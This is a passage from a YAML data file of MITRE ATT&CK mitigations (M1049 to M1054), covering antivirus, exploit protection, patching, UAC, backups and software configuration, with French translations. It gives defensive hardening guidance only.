      \ malicious activity patterns that don\u2019t rely on known signatures.\nhttps://attack.mitre.org/mitigations/M1049"
    translations:
      fr:
        name: Antivirus/Antimalware
        description: "Les solutions antivirus/anti-malware utilisent des signatures,\
          \ des m\xE9thodes heuristiques et l\u2019analyse comportementale pour d\xE9\
          tecter, bloquer et \xE9liminer les logiciels malveillants, notamment les\
          \ virus, les chevaux de Troie, les ransomwares et les logiciels espions.\
          \ Ces solutions surveillent en permanence les terminaux et les syst\xE8\
          mes \xE0 la recherche de mod\xE8les malveillants connus et de comportements\
          \ suspects indiquant une compromission. Les logiciels antivirus/anti-malware\
          \ doivent \xEAtre d\xE9ploy\xE9s sur tous les appareils, avec des mises\
          \ \xE0 jour automatis\xE9es afin d\u2019assurer une protection contre les\
          \ menaces les plus r\xE9centes. Cette mesure de protection peut \xEAtre\
          \ mise en \u0153uvre gr\xE2ce aux mesures suivantes :\n\nD\xE9tection bas\xE9\
          e sur les signatures :\n\n- Mise en \u0153uvre : utiliser des signatures\
          \ pr\xE9d\xE9finies pour identifier les logiciels malveillants connus en\
          \ se basant sur des mod\xE8les uniques tels que les hachages de fichiers,\
          \ les s\xE9quences d\u2019octets ou les arguments de ligne de commande.\
          \ Cette m\xE9thode est efficace contre les menaces connues.\n- Cas d\u2019\
          utilisation : lorsqu\u2019un logiciel malveillant tel qu\u2019\xAB Emotet\
          \ \xBB est d\xE9tect\xE9, sa signature (par exemple, un hachage de fichier\
          \ sp\xE9cifique) correspond \xE0 une signature r\xE9pertori\xE9e dans une\
          \ base de donn\xE9es de logiciels malveillants, ce qui d\xE9clenche une\
          \ alerte et permet la mise en quarantaine imm\xE9diate du fichier infect\xE9\
          .\n\nD\xE9tection heuristique :\n\n- Mise en \u0153uvre : d\xE9ployez des\
          \ algorithmes heuristiques qui analysent le comportement et les caract\xE9\
          ristiques des fichiers et des processus afin d\u2019identifier les logiciels\
          \ malveillants potentiels, m\xEAme s\u2019ils ne correspondent \xE0 aucune\
          \ signature connue.\n- Cas d\u2019utilisation : si un programme tente de\
          \ modifier plusieurs fichiers syst\xE8me critiques ou d\u2019initier des\
          \ communications r\xE9seau suspectes, l\u2019analyse heuristique peut le\
          \ signaler comme potentiellement malveillant, m\xEAme en l\u2019absence\
          \ de signature sp\xE9cifique de logiciel malveillant.\n\nD\xE9tection comportementale\
          \ (pr\xE9vention comportementale) :\n\n- Mise en \u0153uvre : utiliser l\u2019\
          analyse comportementale pour d\xE9tecter des sch\xE9mas d\u2019activit\xE9\
          s anormales, tels que des appels syst\xE8me inhabituels, le chiffrement\
          \ non autoris\xE9 de fichiers ou des tentatives d\u2019escalade de privil\xE8\
          ges.\n- Cas d\u2019utilisation : l\u2019analyse comportementale permet de\
          \ d\xE9tecter pr\xE9cocement les attaques par ransomware en identifiant\
          \ des comportements tels que le chiffrement massif de fichiers, avant m\xEA\
          me qu\u2019une signature sp\xE9cifique du ransomware n\u2019ait \xE9t\xE9\
          \ identifi\xE9e.\n\nAnalyse en temps r\xE9el :\n\n- Mise en \u0153uvre :\
          \ activez l\u2019analyse en temps r\xE9el pour inspecter automatiquement\
          \ les fichiers et le trafic r\xE9seau \xE0 la recherche de signes de logiciels\
          \ malveillants au moment o\xF9 ils sont consult\xE9s, t\xE9l\xE9charg\xE9\
          s ou ex\xE9cut\xE9s.\n- Cas d\u2019utilisation : lorsqu\u2019un utilisateur\
          \ t\xE9l\xE9charge une pi\xE8ce jointe \xE0 un e-mail, la solution antivirus\
          \ analyse le fichier en temps r\xE9el, en le comparant \xE0 la fois aux\
          \ signatures et aux r\xE8gles heuristiques afin de d\xE9tecter tout contenu\
          \ malveillant avant qu\u2019il ne puisse \xEAtre ouvert.\n\nRenseignements\
          \ sur les menaces assist\xE9s par le cloud :\n\n- Mise en \u0153uvre : utilisez\
          \ des renseignements sur les menaces bas\xE9s sur le cloud pour garantir\
          \ que la solution antivirus puisse acc\xE9der aux derni\xE8res d\xE9finitions\
          \ de logiciels malveillants et aux flux de menaces en temps r\xE9el provenant\
          \ d\u2019une base de donn\xE9es mondiale des menaces \xE9mergentes.\n- Cas\
          \ d\u2019utilisation : les solutions antivirus assist\xE9es par le cloud\
          \ identifient rapidement les logiciels malveillants nouvellement d\xE9couverts\
          \ en effectuant des recoupements avec des bases de donn\xE9es mondiales\
          \ sur les menaces, offrant ainsi une protection en temps r\xE9el contre\
          \ les attaques \xAB zero-day \xBB.\n\n**Tools for Implementation**:\n\n\
          - Endpoint Security Platforms: Use solutions such as EDR for comprehensive\
          \ antivirus/antimalware protection across all systems.\n- Centralized Management:\
          \ Implement centralized antivirus management consoles that provide visibility\
          \ into threat activity, enable policy enforcement, and automate updates.\n\
          - Behavioral Analysis Tools: Leverage solutions with advanced behavioral\
          \ analysis capabilities to detect malicious activity patterns that don\u2019\
          t rely on known signatures.\nhttps://attack.mitre.org/mitigations/M1049"
  - urn: urn:intuitem:risk:function:mitre-attack:m1050
    ref_id: M1050
    name: Exploit Protection
    category: technical
    csf_function: detect
    description: 'Deploy capabilities that detect, block, and mitigate conditions
      indicative of software exploits. These capabilities aim to prevent exploitation
      by addressing vulnerabilities, monitoring anomalous behaviors, and applying
      exploit-mitigation techniques to harden systems and software.


      Operating System Exploit Protections:


      - Use Case: Enable built-in exploit protection features provided by modern operating
      systems, such as Microsoft''s Exploit Protection, which includes techniques
      like Data Execution Prevention (DEP), Address Space Layout Randomization (ASLR),
      and Control Flow Guard (CFG).

      - Implementation: Enforce DEP for all programs and enable ASLR to randomize
      memory addresses used by system and application processes. Windows: Configure
      Exploit Protection through the Windows Security app or deploy settings via Group
      Policy.

      `ExploitProtectionExportSettings.exe -path "exploit_settings.xml"`

      Linux: Use Kernel-level hardening features like SELinux, AppArmor, or GRSEC
      to enforce memory protections and prevent exploits.


      Third-Party Endpoint Security:


      - Use Case: Use endpoint protection tools with built-in exploit protection,
      such as enhanced memory protection, behavior monitoring, and real-time exploit
      detection.

      - Implementation: Deploy tools to detect and block exploitation attempts targeting
      unpatched software.


      Virtual Patching:

      - Use Case: Use tools to implement virtual patches that mitigate vulnerabilities
      in applications or operating systems until official patches are applied.

      - Implementation: Use Intrusion Prevention System (IPS) to block exploitation
      attempts on known vulnerabilities in outdated applications.


      Hardening Application Configurations:


      - Use Case: Disable risky application features that can be exploited, such as
      macros in Microsoft Office or JScript in Internet Explorer.

      - Implementation: Configure Microsoft Office Group Policies to disable execution
      of macros in downloaded files.

      https://attack.mitre.org/mitigations/M1050'
    translations:
      fr:
        name: Protection contre les exploits
        description: "D\xE9ploiez des capacit\xE9s qui d\xE9tectent, bloquent et att\xE9\
          nuent les conditions indicatives d\u2019exploits logiciels. Ces capacit\xE9\
          s visent \xE0 pr\xE9venir l\u2019exploitation en corrigeant les vuln\xE9\
          rabilit\xE9s, en surveillant les comportements anormaux et en appliquant\
          \ des techniques d\u2019att\xE9nuation des exploits pour renforcer les syst\xE8\
          mes et les logiciels.\n\nProtection contre les failles du syst\xE8me d\u2019\
          exploitation :\n\n- Cas d\u2019utilisation : Activer les fonctionnalit\xE9\
          s int\xE9gr\xE9es de protection contre les exploits fournies par les syst\xE8\
          mes d\u2019exploitation modernes, telles que la protection contre les exploits\
          \ de Microsoft, qui inclut des techniques telles que la pr\xE9vention de\
          \ l\u2019ex\xE9cution des donn\xE9es (DEP), la randomisation de disposition\
          \ de l\u2019espace d\u2019adressage (ASLR) et la garde de flux de contr\xF4\
          le (CFG).\n- Impl\xE9mentation : Appliquer le DEP pour tous les programmes\
          \ et permettre \xE0 ASLR de randomiser les adresses m\xE9moire utilis\xE9\
          es par les processus syst\xE8me et applicatif. Windows : Configurez la protection\
          \ contre les exploits via l\u2019application Windows Security ou d\xE9ployez\
          \ les param\xE8tres via la Strat\xE9gie de groupe.\n\xAB ExploitProtectionExportSettings.exe\
          \ -chemin \xAB exploit_settings.xml \xBB\nLinux : Utilisez des fonctionnalit\xE9\
          s de durcissement au niveau du noyau comme SELinux, AppArmor ou GRSEC pour\
          \ renforcer les protections m\xE9moire et pr\xE9venir les failles.\n\nS\xE9\
          curit\xE9 des points d\u2019extr\xE9mit\xE9 tiers :\n\n- Cas d\u2019utilisation\
          \ : Utilisez des outils de protection des terminaux avec une protection\
          \ int\xE9gr\xE9e contre les exploits, tels que la protection m\xE9moire\
          \ am\xE9lior\xE9e, la surveillance du comportement et la d\xE9tection d\u2019\
          exploits en temps r\xE9el.\n- Impl\xE9mentation : d\xE9ployer des outils\
          \ pour d\xE9tecter et bloquer les tentatives d\u2019exploitation ciblant\
          \ des logiciels non corrig\xE9s.\n\nPatching virtuel :\n- Cas d\u2019utilisation\
          \ : Utiliser des outils pour impl\xE9menter des correctifs virtuels qui\
          \ att\xE9nuent les vuln\xE9rabilit\xE9s dans les applications ou syst\xE8\
          mes d\u2019exploitation jusqu\u2019\xE0 ce que les correctifs officiels\
          \ soient appliqu\xE9s.\n- Mise en \u0153uvre : Utiliser le syst\xE8me de\
          \ pr\xE9vention des intrusions (IPS) pour bloquer les tentatives d\u2019\
          exploitation sur des vuln\xE9rabilit\xE9s connues dans des applications\
          \ obsol\xE8tes.\n\nDurcissement des configurations d\u2019application :\n\
          \n- Cas d\u2019utilisation : D\xE9sactiver les fonctionnalit\xE9s d\u2019\
          application risqu\xE9es pouvant \xEAtre exploit\xE9es, telles que les macros\
          \ dans Microsoft Office ou JScript dans Internet Explorer.\n- Impl\xE9mentation\
          \ : Configurez les politiques de groupe Microsoft Office pour d\xE9sactiver\
          \ l\u2019ex\xE9cution des macros dans les fichiers t\xE9l\xE9charg\xE9s.\n\
          https://attack.mitre.org/mitigations/M1050"
  - urn: urn:intuitem:risk:function:mitre-attack:m1051
    ref_id: M1051
    name: Update Software
    category: technical
    csf_function: protect
    description: "Software updates ensure systems are protected against known vulnerabilities\
      \ by applying patches and upgrades provided by vendors. Regular updates reduce\
      \ the attack surface and prevent adversaries from exploiting known security\
      \ gaps. This includes patching operating systems, applications, drivers, and\
      \ firmware. This mitigation can be implemented through the following measures:\n\
      \nRegular Operating System Updates\n\n- Implementation: Apply the latest Windows\
      \ security updates monthly using WSUS (Windows Server Update Services) or a\
      \ similar patch management solution. Configure systems to check for updates\
      \ automatically and schedule reboots during maintenance windows.\n- Use Case:\
      \ Prevents exploitation of OS vulnerabilities such as privilege escalation or\
      \ remote code execution.\n\nApplication Patching\n\n- Implementation: Monitor\
      \ Apache's update release notes for security patches addressing vulnerabilities.\
      \ Schedule updates for off-peak hours to avoid downtime while maintaining security\
      \ compliance.\n- Use Case: Prevents exploitation of web application vulnerabilities,\
      \ such as those leading to unauthorized access or data breaches.\n\nFirmware\
      \ Updates\n\n- Implementation: Regularly check the vendor\u2019s website for\
      \ firmware updates addressing vulnerabilities. Plan for update deployment during\
      \ scheduled maintenance to minimize business disruption.\n- Use Case: Protects\
      \ against vulnerabilities that adversaries could exploit to gain access to network\
      \ devices or inject malicious traffic.\n\nEmergency Patch Deployment\n\n- Implementation:\
      \ Use the emergency patch deployment feature of the organization's patch management\
      \ tool to apply updates to all affected Exchange servers within 24 hours.\n\
      - Use Case: Reduces the risk of exploitation by rapidly addressing critical\
      \ vulnerabilities.\n\nCentralized Patch Management\n\n- Implementation: Implement\
      \ a centralized patch management system, such as SCCM or ManageEngine, to automate\
      \ and track patch deployment across all environments. Generate regular compliance\
      \ reports to ensure all systems are updated.\n- Use Case: Streamlines patching\
      \ processes and ensures no critical systems are missed.\n\n*Tools for Implementation*\n\
      \nPatch Management Tools:\n\n- WSUS: Manage and deploy Microsoft updates across\
      \ the organization.\n- ManageEngine Patch Manager Plus: Automate patch deployment\
      \ for OS and third-party apps.\n- Ansible: Automate updates across multiple\
      \ platforms, including Linux and Windows.\n\nVulnerability Scanning Tools:\n\
      \n- OpenVAS: Open-source vulnerability scanning to identify missing patches.\n\
      https://attack.mitre.org/mitigations/M1051"
    translations:
      fr:
        name: "Logiciel de mise \xE0 jour"
        description: "Les mises \xE0 jour logicielles garantissent la protection des\
          \ syst\xE8mes contre les vuln\xE9rabilit\xE9s connues en appliquant des\
          \ correctifs et des mises \xE0 jour fournis par les fournisseurs. Des mises\
          \ \xE0 jour r\xE9guli\xE8res r\xE9duisent la surface d\u2019attaque et emp\xEA\
          chent les adversaires d\u2019exploiter les failles de s\xE9curit\xE9 connues.\
          \ Cela inclut la correction des syst\xE8mes d\u2019exploitation, des applications,\
          \ des pilotes et des firmwares. Cette att\xE9nuation peut \xEAtre mise en\
          \ \u0153uvre par les mesures suivantes :\n\nMises \xE0 jour r\xE9guli\xE8\
          res du syst\xE8me d\u2019exploitation\n\n- Impl\xE9mentation : Appliquer\
          \ les derni\xE8res mises \xE0 jour de s\xE9curit\xE9 Windows chaque mois\
          \ en utilisant WSUS (Windows Server Update Services) ou une solution similaire\
          \ de gestion des correctifs. Configurez les syst\xE8mes pour v\xE9rifier\
          \ automatiquement les mises \xE0 jour et programmez les red\xE9marrages\
          \ pendant les fen\xEAtres de maintenance.\n- Cas d\u2019utilisation : Emp\xEA\
          che l\u2019exploitation de vuln\xE9rabilit\xE9s du syst\xE8me d\u2019exploitation\
          \ telles que l\u2019escalade de privil\xE8ges ou l\u2019ex\xE9cution \xE0\
          \ distance du code.\n\nCorrectifs d\u2019applications\n\n- Impl\xE9mentation\
          \ : Surveillez les notes de mise \xE0 jour d\u2019Apache pour les correctifs\
          \ de s\xE9curit\xE9 r\xE9pondant aux vuln\xE9rabilit\xE9s. Programmez les\
          \ mises \xE0 jour pour les heures creuses afin d\u2019\xE9viter les interruptions\
          \ tout en maintenant la conformit\xE9 \xE0 la s\xE9curit\xE9.\n- Cas d\u2019\
          utilisation : Emp\xEAche l\u2019exploitation des vuln\xE9rabilit\xE9s des\
          \ applications web, telles que celles conduisant \xE0 des acc\xE8s non autoris\xE9\
          s ou \xE0 des violations de donn\xE9es.\n\nMises \xE0 jour du firmware\n\
          \n- Impl\xE9mentation : V\xE9rifier r\xE9guli\xE8rement le site web du fournisseur\
          \ pour d\xE9tecter des mises \xE0 jour du firmware concernant les vuln\xE9\
          rabilit\xE9s. Pr\xE9voyez le d\xE9ploiement des mises \xE0 jour pendant\
          \ la maintenance programm\xE9e afin de minimiser les perturbations de l\u2019\
          activit\xE9.\n- Cas d\u2019utilisation : Prot\xE8ge contre les vuln\xE9\
          rabilit\xE9s que les adversaires pourraient exploiter pour acc\xE9der \xE0\
          \ des dispositifs r\xE9seau ou injecter du trafic malveillant.\n\nD\xE9\
          ploiement d\u2019urgence du patch\n\n- Mise en \u0153uvre : Utiliser la\
          \ fonction de d\xE9ploiement d\u2019urgence des correctifs de l\u2019outil\
          \ de gestion des correctifs de l\u2019organisation pour appliquer des mises\
          \ \xE0 jour \xE0 tous les serveurs Exchange concern\xE9s dans les 24 heures.\n\
          - Cas d\u2019utilisation : R\xE9duit le risque d\u2019exploitation en traitant\
          \ rapidement les vuln\xE9rabilit\xE9s critiques.\n\nGestion centralis\xE9\
          e des correctifs\n\n- Mise en \u0153uvre : Mettre en place un syst\xE8me\
          \ centralis\xE9 de gestion des correctifs, tel que SCCM ou ManageEngine,\
          \ pour automatiser et suivre le d\xE9ploiement des correctifs dans tous\
          \ les environnements. G\xE9n\xE9rez r\xE9guli\xE8rement des rapports de\
          \ conformit\xE9 pour garantir que tous les syst\xE8mes sont mis \xE0 jour.\n\
          - Cas d\u2019utilisation : Simplifie les processus de correctifs et garantit\
          \ qu\u2019aucun syst\xE8me critique n\u2019est manqu\xE9.\n\n*Outils pour\
          \ la mise en \u0153uvre*\n\nOutils de gestion des correctifs :\n\n- WSUS\
          \ : G\xE9rer et d\xE9ployer les mises \xE0 jour Microsoft \xE0 travers l\u2019\
          organisation.\n- ManageEngine Patch Manager Plus : Automatisation du d\xE9\
          ploiement des correctifs pour le syst\xE8me d\u2019exploitation et les applications\
          \ tierces.\n- Ansible : Automatiser les mises \xE0 jour sur plusieurs plateformes,\
          \ y compris Linux et Windows.\n\nOutils de scan des vuln\xE9rabilit\xE9\
          s :\n\n- OpenVAS : analyse des vuln\xE9rabilit\xE9s open source pour identifier\
          \ les correctifs manquants.\nhttps://attack.mitre.org/mitigations/M1051"
  - urn: urn:intuitem:risk:function:mitre-attack:m1052
    ref_id: M1052
    name: User Account Control
    category: technical
    csf_function: protect
    description: 'User Account Control (UAC) is a security feature in Microsoft Windows
      that prevents unauthorized changes to the operating system. UAC prompts users
      to confirm or provide administrator credentials when an action requires elevated
      privileges. Proper configuration of UAC reduces the risk of privilege escalation
      attacks. This mitigation can be implemented through the following measures:


      Enable UAC Globally:


      - Ensure UAC is enabled through Group Policy by setting `User Account Control:
      Run all administrators in Admin Approval Mode` to `Enabled`.


      Require Credential Prompt:


      - Use Group Policy to configure UAC to prompt for administrative credentials
      instead of just confirmation (`User Account Control: Behavior of the elevation
      prompt`).


      Restrict Built-in Administrator Account:


      Set `Admin Approval Mode` for the built-in Administrator account to `Enabled`
      in Group Policy.


      Secure the UAC Prompt:


      - Configure UAC prompts to display on the secure desktop (`User Account Control:
      Switch to the secure desktop when prompting for elevation`).


      Prevent UAC Bypass:


      - Block untrusted applications from triggering UAC prompts by configuring `User
      Account Control: Only elevate executables that are signed and validated`.

      - Use EDR tools to detect and block known UAC bypass techniques.


      Monitor UAC-Related Events:


      - Use Windows Event Viewer to monitor for event ID 4688 (process creation) and
      look for suspicious processes attempting to invoke UAC elevation.


      *Tools for Implementation*


      Built-in Windows Tools:


      - Group Policy Editor: Configure UAC settings centrally for enterprise environments.

      - Registry Editor: Modify UAC-related settings directly, such as `EnableLUA`
      and `ConsentPromptBehaviorAdmin`.


      Endpoint Security Solutions:


      - Microsoft Defender for Endpoint: Detects and blocks UAC bypass techniques.

      - Sysmon: Logs process creations and monitors UAC elevation attempts for suspicious
      activity.


      Third-Party Security Tools:


      - Process Monitor (Sysinternals): Tracks real-time processes interacting with
      UAC.

      - EventSentry: Monitors Windows Event Logs for UAC-related alerts.

      https://attack.mitre.org/mitigations/M1052'
    translations:
      fr:
        name: "Contr\xF4le des comptes utilisateurs"
        description: "Le Contr\xF4le des comptes utilisateurs (UAC) est une fonctionnalit\xE9\
          \ de s\xE9curit\xE9 dans Microsoft Windows qui emp\xEAche les modifications\
          \ non autoris\xE9es du syst\xE8me d\u2019exploitation. L\u2019UAC invite\
          \ les utilisateurs \xE0 confirmer ou fournir des identifiants administrateur\
          \ lorsqu\u2019une action n\xE9cessite des privil\xE8ges \xE9lev\xE9s. Une\
          \ configuration appropri\xE9e des UAC r\xE9duit le risque d\u2019attaques\
          \ d\u2019escalade de privil\xE8ges. Cette att\xE9nuation peut \xEAtre mise\
          \ en \u0153uvre par les mesures suivantes :\n\nActivez l\u2019UAC \xE0 l\u2019\
          \xE9chelle mondiale :\n\n- S\u2019assurer que UAC est activ\xE9 via la Strat\xE9\
          gie de Groupe en d\xE9finissant \xAB Contr\xF4le du compte utilisateur :\
          \ ex\xE9cuter tous les administrateurs en mode d\u2019approbation admin\
          \ \xBB sur \xAB Activ\xE9 \xBB.\n\nDemande de cr\xE9dential :\n\n- Utiliser\
          \ la Strat\xE9gie de Groupe pour configurer l\u2019UAC afin qu\u2019il demande\
          \ des identifiants administratifs au lieu de simplement confirmer (\xAB\
          \ Contr\xF4le du compte utilisateur : Comportement de l\u2019invite d\u2019\
          \xE9l\xE9vation \xBB).\n\nRestreindre le compte administrateur int\xE9gr\xE9\
          \ :\n\nD\xE9finissez \xAB Mode d\u2019approbation administrateur \xBB pour\
          \ le compte administrateur int\xE9gr\xE9 sur \xAB Activ\xE9 \xBB dans la\
          \ Strat\xE9gie de groupe.\n\nS\xE9curiser le prompt UAC :\n\n- Configurer\
          \ les invites UAC pour s\u2019afficher sur le bureau s\xE9curis\xE9 (\xAB\
          \ Contr\xF4le du compte utilisateur : basculer sur le bureau s\xE9curis\xE9\
          \ lors d\u2019une demande d\u2019\xE9l\xE9vation \xBB).\n\nPr\xE9venir le\
          \ contournement UAC :\n\n- Bloquer les applications non fiables qui d\xE9\
          clenchent les invites UAC en configurant \xAB Contr\xF4le des comptes utilisateur\
          \ : n\u2019\xE9lever que les ex\xE9cutables sign\xE9s et valid\xE9s \xBB\
          .\n- Utiliser des outils EDR pour d\xE9tecter et bloquer les techniques\
          \ de contournement UAC connues.\n\nSurveiller les \xE9v\xE9nements li\xE9\
          s \xE0 l\u2019UAC :\n\n- Utiliser le Visualiseur d\u2019\xE9v\xE9nements\
          \ Windows pour surveiller l\u2019ID d\u2019\xE9v\xE9nement 4688 (cr\xE9\
          ation de processus) et rechercher les processus suspects tentant d\u2019\
          invoquer l\u2019\xE9l\xE9vation UAC.\n\n*Outils pour la mise en \u0153uvre*\n\
          \nOutils Windows int\xE9gr\xE9s :\n\n- \xC9diteur de Politiques de Groupe\
          \ : Configurez centralis\xE9 les param\xE8tres UAC pour les environnements\
          \ d\u2019entreprise.\n- \xC9diteur de registre : Modifier directement les\
          \ param\xE8tres li\xE9s \xE0 UAC, tels que \xAB EnableLUA \xBB et \xAB ConsentPromptBehaviorAdmin\
          \ \xBB.\n\nSolutions de s\xE9curit\xE9 des terminaux :\n\n- Microsoft Defender\
          \ for Endpoint : D\xE9tecte et bloque les techniques de contournement UAC.\n\
          - Sysmon : Enregistre les journaux de cr\xE9ations et surveille les tentatives\
          \ d\u2019\xE9l\xE9vation des UAC pour d\xE9tecter toute activit\xE9 suspecte.\n\
          \nOutils de s\xE9curit\xE9 tiers :\n\n- Moniteur de processus (Sysinternals)\
          \ : Suit les processus en temps r\xE9el interagissant avec l\u2019UAC.\n\
          - EventSentry : Surveille les journaux d\u2019\xE9v\xE9nements Windows pour\
          \ les alertes li\xE9es aux UAC.\nhttps://attack.mitre.org/mitigations/M1052"
  - urn: urn:intuitem:risk:function:mitre-attack:m1053
    ref_id: M1053
    name: Data Backup
    category: technical
    csf_function: recover
    description: 'Data Backup involves taking and securely storing backups of data
      from end-user systems and critical servers. It ensures that data remains available
      in the event of system compromise, ransomware attacks, or other disruptions.
      Backup processes should include hardening backup systems, implementing secure
      storage solutions, and keeping backups isolated from the corporate network to
      prevent compromise during active incidents. This mitigation can be implemented
      through the following measures:


      Regular Backup Scheduling:

      - Use Case: Ensure timely and consistent backups of critical data.

      - Implementation: Schedule daily incremental backups and weekly full backups
      for all critical servers and systems.


      Immutable Backups:

      - Use Case: Protect backups from modification or deletion, even by attackers.

      - Implementation: Use write-once-read-many (WORM) storage for backups, preventing
      ransomware from encrypting or deleting backup files.


      Backup Encryption:

      - Use Case: Protect data integrity and confidentiality during transit and storage.

      - Implementation: Encrypt backups using strong encryption protocols (e.g., AES-256)
      before storing them in local, cloud, or remote locations.


      Offsite Backup Storage:

      - Use Case: Ensure data availability during physical disasters or onsite breaches.

      - Implementation: Use cloud-based solutions like AWS S3, Azure Backup, or physical
      offsite storage to maintain a copy of critical data.


      Backup Testing:

      - Use Case: Validate backup integrity and ensure recoverability.

      - Implementation: Regularly test data restoration processes to ensure that backups
      are not corrupted and can be recovered quickly.

      https://attack.mitre.org/mitigations/M1053'
    translations:
      fr:
        name: "Sauvegarde des donn\xE9es"
        description: "La sauvegarde de donn\xE9es consiste \xE0 prendre et stocker\
          \ de mani\xE8re s\xE9curis\xE9e des sauvegardes des donn\xE9es provenant\
          \ des syst\xE8mes utilisateurs finaux et des serveurs critiques. Elle garantit\
          \ que les donn\xE9es restent disponibles en cas de compromission du syst\xE8\
          me, d\u2019attaques par ransomware ou d\u2019autres perturbations. Les processus\
          \ de sauvegarde doivent inclure le renforcement des syst\xE8mes de sauvegarde,\
          \ la mise en place de solutions de stockage s\xE9curis\xE9es et le maintien\
          \ des sauvegardes isol\xE9es du r\xE9seau d\u2019entreprise afin d\u2019\
          \xE9viter toute compromission lors d\u2019incidents actifs. Cette att\xE9\
          nuation peut \xEAtre mise en \u0153uvre par les mesures suivantes :\n\n\
          Planification r\xE9guli\xE8re des secours :\n- Cas d\u2019utilisation :\
          \ Assurer des sauvegardes rapides et coh\xE9rentes des donn\xE9es critiques.\n\
          - Mise en \u0153uvre : Programmer des sauvegardes incr\xE9mentales quotidiennes\
          \ et des sauvegardes compl\xE8tes hebdomadaires pour tous les serveurs et\
          \ syst\xE8mes critiques.\n\nSauvegardes immuables :\n- Cas d\u2019utilisation\
          \ : Prot\xE9ger les sauvegardes contre toute modification ou suppression,\
          \ m\xEAme par les attaquants.\n- Impl\xE9mentation : Utilisez le stockage\
          \ write-once-read-many (WORM) pour les sauvegardes, emp\xEAchant les ransomwares\
          \ de chiffrer ou supprimer les fichiers de sauvegarde.\n\nChiffrement de\
          \ sauvegarde :\n- Cas d\u2019utilisation : Prot\xE9ger l\u2019int\xE9grit\xE9\
          \ et la confidentialit\xE9 des donn\xE9es pendant le transit et le stockage.\n\
          - Impl\xE9mentation : chiffrer les sauvegardes \xE0 l\u2019aide de protocoles\
          \ de chiffrement forts (par exemple, AES-256) avant de les stocker dans\
          \ des lieux locaux, cloud ou distants.\n\nStockage de sauvegarde hors site\
          \ :\n- Cas d\u2019utilisation : Assurer la disponibilit\xE9 des donn\xE9\
          es lors de catastrophes physiques ou de violations sur site.\n- Mise en\
          \ \u0153uvre : Utiliser des solutions cloud comme AWS S3, Azure Backup ou\
          \ un stockage physique hors site pour conserver une copie des donn\xE9es\
          \ critiques.\n\nTests de secours :\n- Cas d\u2019utilisation : Valider l\u2019\
          int\xE9grit\xE9 des sauvegardes et garantir la r\xE9cup\xE9rabilit\xE9.\n\
          - Mise en \u0153uvre : Tester r\xE9guli\xE8rement les processus de restauration\
          \ des donn\xE9es afin de s\u2019assurer que les sauvegardes ne sont pas\
          \ corrompues et peuvent \xEAtre r\xE9cup\xE9r\xE9es rapidement.\nhttps://attack.mitre.org/mitigations/M1053"
  - urn: urn:intuitem:risk:function:mitre-attack:m1054
    ref_id: M1054
    name: Software Configuration
    category: technical
    csf_function: protect
    description: 'Software configuration refers to making security-focused adjustments
      to the settings of applications, middleware, databases, or other software to
      mitigate potential threats. These changes help reduce the attack surface, enforce
      best practices, and protect sensitive data. This mitigation can be implemented
      through the following measures:


      Conduct a Security Review of Application Settings:


      - Review the software documentation to identify recommended security configurations.

      - Compare default settings against organizational policies and compliance requirements.


      Implement Access Controls and Permissions:


      - Restrict access to sensitive features or data within the software.

      - Enforce least privilege principles for all roles and accounts interacting
      with the software.


      Enable Logging and Monitoring:


      - Configure detailed logging for key application events such as authentication
      failures, configuration changes, or unusual activity.

      - Integrate logs with a centralized monitoring solution, such as a SIEM.


      Update and Patch Software Regularly:


      - Ensure the software is kept up-to-date with the latest security patches to
      address known vulnerabilities.

      - Use automated patch management tools to streamline the update process.


      Disable Unnecessary Features or Services:


      - Turn off unused functionality or components that could introduce vulnerabilities,
      such as debugging interfaces or deprecated APIs.


      Test Configuration Changes:


      - Perform configuration changes in a staging environment before applying them
      in production.

      - Conduct regular audits to ensure that settings remain aligned with security
      policies.


      *Tools for Implementation*


      Configuration Management Tools:


      - Ansible: Automates configuration changes across multiple applications and
      environments.

      - Chef: Ensures consistent application settings through code-based configuration
      management.

      - Puppet: Automates software configurations and audits changes for compliance.


      Security Benchmarking Tools:


      - CIS-CAT: Provides benchmarks and audits for secure software configurations.

      - Aqua Security Trivy: Scans containerized applications for configuration issues.


      Vulnerability Management Solutions:


      - Nessus: Identifies misconfigurations and suggests corrective actions.


      Logging and Monitoring Tools:


      - Splunk: Aggregates and analyzes application logs to detect suspicious activity.

      https://attack.mitre.org/mitigations/M1054'
    translations:
      fr:
        name: Configuration logicielle
        description: "La configuration logicielle fait r\xE9f\xE9rence \xE0 l\u2019\
          ajustement ax\xE9 sur la s\xE9curit\xE9 des param\xE8tres des applications,\
          \ des middlewares, des bases de donn\xE9es ou d\u2019autres logiciels afin\
          \ de r\xE9duire les menaces potentielles. Ces changements contribuent \xE0\
          \ r\xE9duire la surface d\u2019attaque, \xE0 faire respecter les meilleures\
          \ pratiques et \xE0 prot\xE9ger les donn\xE9es sensibles. Cette att\xE9\
          nuation peut \xEAtre mise en \u0153uvre par les mesures suivantes :\n\n\
          Effectuez un examen de s\xE9curit\xE9 des param\xE8tres d\u2019application\
          \ :\n\n- Examiner la documentation logicielle pour identifier les configurations\
          \ de s\xE9curit\xE9 recommand\xE9es.\n- Comparer les param\xE8tres par d\xE9\
          faut avec les politiques organisationnelles et les exigences de conformit\xE9\
          .\n\nImpl\xE9mentez les contr\xF4les d\u2019acc\xE8s et les autorisations\
          \ :\n\n- Restreindre l\u2019acc\xE8s aux fonctionnalit\xE9s ou donn\xE9\
          es sensibles du logiciel.\n- Faire respecter les principes de privil\xE8\
          ge minimum pour tous les r\xF4les et comptes interagissant avec le logiciel.\n\
          \nActivez la journalisation et la surveillance :\n\n- Configurer une journalisation\
          \ d\xE9taill\xE9e pour les \xE9v\xE9nements cl\xE9s de l\u2019application\
          \ tels que des \xE9checs d\u2019authentification, des modifications de configuration\
          \ ou des activit\xE9s inhabituelles.\n- Int\xE9grer les journaux avec une\
          \ solution de surveillance centralis\xE9e, telle qu\u2019un SIEM.\n\nMettez\
          \ \xE0 jour et corrigez r\xE9guli\xE8rement les logiciels :\n\n- Veiller\
          \ \xE0 ce que le logiciel soit maintenu \xE0 jour avec les derniers correctifs\
          \ de s\xE9curit\xE9 pour corriger les vuln\xE9rabilit\xE9s connues.\n- Utiliser\
          \ des outils automatis\xE9s de gestion des correctifs pour simplifier le\
          \ processus de mise \xE0 jour.\n\nD\xE9sactivez les fonctionnalit\xE9s ou\
          \ services inutiles :\n\n- D\xE9sactiver les fonctionnalit\xE9s ou composants\
          \ inutilis\xE9s pouvant introduire des vuln\xE9rabilit\xE9s, telles que\
          \ des interfaces de d\xE9bogage ou des API obsol\xE8tes.\n\nModifications\
